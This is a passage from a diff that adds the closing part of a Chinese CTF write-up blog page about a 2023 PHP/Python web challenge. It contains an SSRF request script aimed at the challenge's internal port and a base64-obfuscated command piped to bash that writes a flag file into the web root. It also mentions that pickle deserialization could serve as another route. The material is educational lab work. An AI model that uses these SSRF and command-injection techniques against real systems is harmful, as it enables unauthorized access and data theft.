class="string">&quot;lib/&quot;</span>&gt;</span>lib/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;lib64/&quot;</span>&gt;</span>lib64/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;media/&quot;</span>&gt;</span>media/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mnt/&quot;</span>&gt;</span>mnt/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;opt/&quot;</span>&gt;</span>opt/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;proc/&quot;</span>&gt;</span>proc/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;root/&quot;</span>&gt;</span>root/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;run/&quot;</span>&gt;</span>run/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;sbin/&quot;</span>&gt;</span>sbin/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;srv/&quot;</span>&gt;</span>srv/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;sys/&quot;</span>&gt;</span>sys/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;tmp/&quot;</span>&gt;</span>tmp/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;usr/&quot;</span>&gt;</span>usr/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;var/&quot;</span>&gt;</span>var/<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>直接读取ffl14aaaaaaagg，有两种方案，可以ssrf读也可以用file_get_content读，试了都能读。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://eci-2zeif2s8oymjc095x0p5.cloudeci1.ichunqiu.com/M0sT_D4nger0us.php?url=http://127.0.0.1:5556&quot;</span></span><br><span class="line">res = requests.get(url).text</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/31php-python%E7%BB%93%E5%90%88%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE/image-20230907204932060.png" alt="image-20230907204932060"></p>
+<h5 id="结语："><a href="#结语：" class="headerlink" title="结语："></a>结语：</h5><p>最后这个题的内容如果想复现，绝不止步于此，还有很多可以学习的地方，pickle反序列化部分绝对能挖出其他解法。最后查看目录和读取文件也肯定会有其他解法，可以挖一挖。</p>
+<p>例如，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;print(open(&#x27;/flag&#x27;).read())&quot;</span><br><span class="line">cHl0aG9uMyAtYyAicHJpbnQob3BlbignL2ZsYWcnKS5yZWFkKCkpIg==</span><br><span class="line">echo cHl0aG9uMyAtYyAicHJpbnQob3BlbignL2ZsYWcnKS5yZWFkKCkpIg== | base64 -d | bash &gt; /var/www/html/fla</span><br></pre></td></tr></table></figure>
+
+<p>当时试了这个，好像没成功，不过可以挖一挖，应该能行。最后解出来时才知道应该先读取目录的。它是没flag文件的</p>
+
+            </div>
+
+            
+
+            
+                <ul class="post-tags-box">
+                    
+                        <li class="tag-item">
+                            <a href="/tags/web/">#web</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2023/09/17/31%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0Typora%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">漏洞复现：CVE-2023-2317 【Typora 远程代码执行漏洞】</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2023/08/17/30-pennnnnnnnnnntest/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">渗透靶机</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ccb2023-php-python%E7%BB%93%E5%90%88%E7%9A%84%E4%B8%80%E9%81%93%E9%A2%98%E7%9B%AE"><span class="nav-text">[ccb2023] php-python结合的一道题目</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E8%A8%80%EF%BC%9A"><span class="nav-text">前言：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%87%E7%A8%8B%EF%BC%9A"><span class="nav-text">过程：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%93%E8%AF%AD%EF%BC%9A"><span class="nav-text">结语：</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2020</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">lhb</a>
+            
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.5.2</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+
+
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/post-helper.js"></script>
+
+        
+            
+<script src="/js/libs/anime.min.js"></script>
+
+        
+        
+            
+<script src="/js/toc.js"></script>
+
+        
+    
+</div>
+
+
+
+</body>
+</html>
